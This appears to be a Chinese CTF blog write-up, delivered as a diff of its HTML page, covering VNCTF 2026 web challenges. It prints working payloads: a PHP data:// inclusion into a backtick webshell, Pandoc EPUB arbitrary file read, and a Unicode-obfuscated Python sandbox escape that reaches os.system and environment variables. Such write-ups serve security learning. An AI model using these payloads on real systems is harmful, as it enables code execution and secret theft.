@@ -1,0 +1,779 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/3.png">
+  <link rel="icon" href="/img/3.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="AzumiSaki">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]由GET体file传参进行文件包含（当file长度小等于20时）于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;,然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF-2026-Web WP">
+<meta property="og:url" content="https://azumisaki.github.io/2026/03/10/VN-CTF2026/index.html">
+<meta property="og:site_name" content="Sakiの博客">
+<meta property="og:description" content="Signin审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]由GET体file传参进行文件包含（当file长度小等于20时）于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;,然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://azumisaki.github.io/img/2.jpeg">
+<meta property="article:published_time" content="2026-03-09T16:02:01.000Z">
+<meta property="article:modified_time" content="2026-03-10T05:44:42.999Z">
+<meta property="article:author" content="AzumiSaki">
+<meta property="article:tag" content="wp&#x2F;sum">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://azumisaki.github.io/img/2.jpeg">
+  
+  
+  
+  <title>VNCTF-2026-Web WP - Sakiの博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"azumisaki.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="/css/custom.css">
+  <div style="text-align:center;font-size:14px;margin-top:10px;">
+    <span id="runtime"></span>
+  </div>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="global-fx-layer"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Saki&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="VNCTF-2026-Web WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-10 00:02" pubdate>
+          2026年3月10日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">VNCTF-2026-Web WP</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年3月10日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]<br>由GET体file传参进行文件包含（当file长度小等于20时）<br>于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;,<br>然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?php</span>info();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/vnctf2026/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>phpinfo显示short_open_tag&#x3D;On，所以可以用短标签减少字数<br>随后就可以构建一句话了<br>原本是&lt;?&#x3D;eval($_GET[x]);这样的，但是长度超20了<br>于是上网搜得反引号是 shell_exec() 的语法糖<br>即</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>] ===  <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure>
+
+<p>（题目不支持POST传参)<br>所以构得最后payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[x]`;&amp;x=cat /flag<br></code></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/img/vnctf2026/2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>题目是一个登录框，给了一个密码附件，很明显是要去爆破密码，一共两万个密码（）<br>Burp suite抓包发现上传的参数被加密了，所以直接用intruder爆破肯定不现实，所以便然ai写了个模拟键盘输入的python脚本一个个爆破密码，用户名admin<br>最后跑了一个晚上跑出来了（分多个虚拟机同时跑），密码是5V26s9dBZQVBZgyyVC00baeW</p>
+<p><img src="/img/vnctf2026/3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Markdown2world"><a href="#Markdown2world" class="headerlink" title="Markdown2world"></a>Markdown2world</h2><p>首先试了一下上传别的后缀文件，提示只能上传.md或.markdown后缀的文件，于是只能在Pandoc机制，转换机制，和不同类型文件的特性中研究<br>题目提示了 </p>
+<p><img src="/img/vnctf2026/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>于是只能上网搜一下这几种文件都有哪些可能的漏洞</p>
+<p>发现可以试试tamplate模板注入，于是构造payload：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">template:</span> <span class="hljs-symbol">/flag</span><br><br>xxxxxxxxx（一定要写）<br></code></pre></td></tr></table></figure>
+
+<p>上传，发现被拦截了<br>template和reference-doc被过滤，pdf文件有上传不了，只能试试通过资源文件引用+EPUB打包机制 进行任意文件读取，或者通过文件名注入命令了<br>首先是看了上传后文件名会被重新修改，于是随便上传了一个名为<?phpinfo();?>.md的文件。但是没用<br>那就只能试试Pandoc的特性:<br>Pandoc生成EPUB时，有一个特性叫 “Resource Fetching”（资源抓取），只要通过构造特殊的资源抓取语句来改变EPUB抓取的资源的路径即可达到类似于“文件包含”的效果，将flag打包下载下来</p>
+<p>Payload（可以多设几条路径提高拿到flag的概率）：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">resource-path:</span> [<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;/home/ctf&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>]<br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-type">![flag](/flag)</span><br></code></pre></td></tr></table></figure>
+
+<p>下载下来后可以改后缀为.zip来解压<br>在解压包中拿到flag：</p>
+<p><img src="/img/vnctf2026/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/vnctf2026/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>（本来想试试docx和html的漏洞的，但试了几个常见的payload发现没那么简单）</p>
+<h2 id="I-really-really-really"><a href="#I-really-really-really" class="headerlink" title="I really really really"></a>I really really really</h2><p>看到题目发现考的是python沙箱逃逸（慌了），只能现学现卖了()<br>先进行简单的fuzz测试，发现常规的’ “ [ ] { } __ ;和数字0-9都被过滤了，hint提及unicode，于是就去搜寻这些字符有关的unicode编码其他格式（查了超多资料，这里只写了有用的编码）<br>发现单引号:  ʼ [U+02BC]修饰符右单引号<br>没被过滤<br>发现_没被过滤<br>就想着引入模块去做，结果发现几乎全部的模块都被删了（应该是所有的）<br>首先先要解决__的问题，这里用了fuzz测试了多种组合：_̲  ﹍﹎ ﹏﹍ ⁔﹍ ﹋﹌等等等一大把<br>最后发现只有_̲ 和 ﹎_没被过滤，本来以为_̲ 可以，结果不知道为啥系统自动识别成了普通字符</p>
+<p><img src="/img/vnctf2026/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/vnctf2026/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>随后就是关键字的问题，本来想着用ʼ claʼ +ʼss ʼ的方法绕过的，但是失败了，但是后来看到题目的字体后才发觉可以试试数学花体字母𝓬𝓵𝓪𝓼𝓼，于是就成功了<br>等基本的完工后就运用一点ssti的知识读取flag<br>但是不知道为啥始终返回空白<br>等后面群里师傅说在环境变量里也有flag才找到另一条生路<br>首先鉴于单行字符不能超过30，所以采用拼接的方式串联起payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br> <span class="hljs-keyword">try</span>:<br>  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
+
+<p>随后就是通过报错<br>（触发AssertionError: &lt;r的内容&gt;，错误信息一定会显示在网页回显中）读取environ字典了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br>r=()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br> <span class="hljs-keyword">try</span>:<br>  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br>  e=g.get(k).environ<br>  r=e<br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
+<p>但是这个回显是 </p>
+<p><img src="/img/vnctf2026/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟ai探讨了一个小时左右，发现原来不是模块被删了，而是放到别的模块去了（应该是的），所以只能利用一个try&#x2F;expect循环遍历__init__.__globals__找到包含os模块的globals<br>最后生成的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br>r=()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br> <span class="hljs-keyword">try</span>:<br>  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br>  <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> g:<br>   <span class="hljs-keyword">try</span>:<br>    e=g.get(k).environ<br>    r=e<br>   <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
+<p>在环境变量中找到flag：</p>
+<p><img src="/img/vnctf2026/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实我本来是想把flag导入到同目录的文件中的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br>r=()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br> <span class="hljs-keyword">try</span>:<br>  g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br>  h=g.get(ʼosʼ)<br>  h.system(ʼcat /flag&gt;/tmp/aʼ)<br> <span class="hljs-keyword">except</span>:<br>  <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure>
+
+<p>但是代码太长了，导致不能实现</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%B5%9B%E5%90%8Ewp/" class="category-chain-item">赛后wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp-sum/" class="print-no-link">#wp/sum</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>VNCTF-2026-Web WP</div>
+      <div>https://azumisaki.github.io/2026/03/10/VN-CTF2026/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>AzumiSaki</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/14/Auth-China/" title="2026软件系统安全赛初赛-Web-Auth wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2026软件系统安全赛初赛-Web-Auth wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/navbar-hide.js"></script><script src="/js/runtime.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div id="corner-cat" aria-hidden="true">
+    <div class="cat-svg-wrap">
+      <svg class="cat-svg" viewBox="0 0 140 90" xmlns="http://www.w3.org/2000/svg">
+        <g class="cat-tail">
+          <path d="M112 54 C128 42, 132 30, 122 18 C136 24, 138 42, 126 56"
+                fill="none" stroke="currentColor" stroke-width="6" stroke-linecap="round"/>
+        </g>
+
+        <g class="cat-body-main">
+          <ellipse cx="72" cy="52" rx="34" ry="22" fill="currentColor" opacity="0.16"/>
+          <ellipse cx="70" cy="48" rx="30" ry="20" fill="currentColor"/>
+          <circle cx="42" cy="42" r="16" fill="currentColor"/>
+
+          <path d="M31 31 L36 18 L43 31 Z" fill="currentColor"/>
+          <path d="M41 31 L48 18 L52 32 Z" fill="currentColor"/>
+
+          <path d="M35 42 h4" class="cat-eye left-eye"/>
+          <path d="M45 42 h4" class="cat-eye right-eye"/>
+
+          <circle cx="41.5" cy="46.5" r="1.2" fill="#f6c2d8"/>
+          <path d="M39 49 Q41.5 51 44 49" class="cat-mouth"/>
+
+          <path d="M28 46 h-10" class="cat-whisker"/>
+          <path d="M28 49 h-9" class="cat-whisker"/>
+          <path d="M55 46 h10" class="cat-whisker"/>
+          <path d="M55 49 h9" class="cat-whisker"/>
+
+          <g class="cat-legs">
+            <path d="M56 63 v12" class="cat-leg"/>
+            <path d="M68 65 v12" class="cat-leg"/>
+            <path d="M82 65 v12" class="cat-leg"/>
+            <path d="M94 63 v12" class="cat-leg"/>
+          </g>
+        </g>
+      </svg>
+    </div>
+  </div>
+
+  <div class="anime-footer-wrap">
+    <div class="anime-footer">
+      <div class="footer-line"><span id="runtime"></span></div>
